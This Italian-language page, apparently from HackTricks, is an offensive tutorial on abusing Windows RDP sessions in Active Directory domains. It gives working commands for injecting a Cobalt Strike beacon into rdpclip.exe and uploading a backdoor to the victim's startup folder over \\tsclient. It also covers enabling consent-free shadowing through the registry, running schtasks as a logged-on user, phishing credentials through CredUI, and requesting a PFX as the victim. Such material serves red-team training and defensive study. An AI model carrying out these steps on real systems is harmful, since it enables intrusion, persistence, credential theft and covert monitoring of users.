# Abuso delle sessioni RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Se il **gruppo esterno** ha **accesso RDP** a qualsiasi **computer** nel dominio corrente, un **attaccante** potrebbe **compromettere quel computer e attendere l'utente**.

Una volta che quell'utente si è connesso via RDP, l'**attaccante** può pivot sulla sessione di quell'utente e abusare dei suoi permessi nel dominio esterno.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Controlla **altri modi per rubare sessioni con altri strumenti** [**in questa pagina.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Se un utente accede via **RDP into a machine** dove un **attacker** lo sta **waiting**, l'**attacker** sarà in grado di **inject a beacon in the RDP session of the user** e se la **victim mounted his drive** quando si connette via RDP, il **attacker could access it**.

In questo caso potresti semplicemente **compromise** il **victims** **original computer** scrivendo un **backdoor** nella **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Se sei **local admin** su un host dove la vittima ha già una **active RDP session**, potresti essere in grado di **view/control that desktop without stealing the password or dumping LSASS**.

Questo dipende dalla policy di **Remote Desktop Services shadowing** memorizzata in:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valori interessanti:

- `0`: Disabilitato
- `1`: `EnableInputNotify` (controllo, approvazione dell'utente richiesta)
- `2`: `EnableInputNoNotify` (controllo, **nessuna approvazione dell'utente**)
- `3`: `EnableNoInputNotify` (solo visualizzazione, approvazione dell'utente richiesta)
- `4`: `EnableNoInputNoNotify` (solo visualizzazione, **nessuna approvazione dell'utente**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Questo è particolarmente utile quando un utente privilegiato connesso via RDP ha lasciato il desktop sbloccato, una sessione KeePass, la console MMC, una sessione del browser o un admin shell aperti.

## Scheduled Tasks As Logged-On User

Se sei **local admin** e l'utente target è **attualmente connesso**, Task Scheduler può avviare codice **come quell'utente senza la sua password**.

Questo trasforma la sessione di accesso esistente della vittima in una primitiva di esecuzione:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Note:

- Se l'utente **non è connesso**, Windows di solito richiede la password per creare un'attività che venga eseguita come quell'utente.
- Se l'utente **è connesso**, l'attività può riutilizzare il contesto di logon esistente.
- Questo è un modo pratico per eseguire azioni GUI o avviare binari all'interno della sessione della vittima senza toccare LSASS.

## CredUI Prompt Abuse From the Victim Session

Una volta che puoi eseguire **all'interno del desktop interattivo della vittima** (ad esempio tramite **Shadow RDP** o **un'attività pianificata eseguita come quell'utente**), puoi mostrare un **vero prompt di credenziali di Windows** usando le API CredUI e raccogliere le credenziali inserite dalla vittima.

API rilevanti:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Flusso tipico:

1. Avviare un binario nella sessione della vittima.
2. Mostrare un prompt di autenticazione di dominio che corrisponda al branding del dominio corrente.
3. Unpackare il buffer di auth restituito.
4. Validare le credenziali fornite e, opzionalmente, continuare a richiedere fino a quando non vengono inserite credenziali valide.

Questo è utile per il **on-host phishing** perché il prompt viene renderizzato dalle API standard di Windows invece che da un form HTML falso.

## Requesting a PFX In the Victim Context

Lo stesso primitivo **scheduled-task-as-user** può essere usato per richiedere un **certificate/PFX come l'utente connesso**. Quel certificato può poi essere usato per **AD authentication** come quell'utente, evitando del tutto il furto della password.

Flusso ad alto livello:

1. Ottenere **local admin** su un host dove la vittima è connessa.
2. Eseguire la logica di enrollment/export come la vittima usando una **scheduled task**.
3. Esportare il **PFX** risultante.
4. Usare il PFX per PKINIT / autenticazione AD basata su certificato.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Riferimenti

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
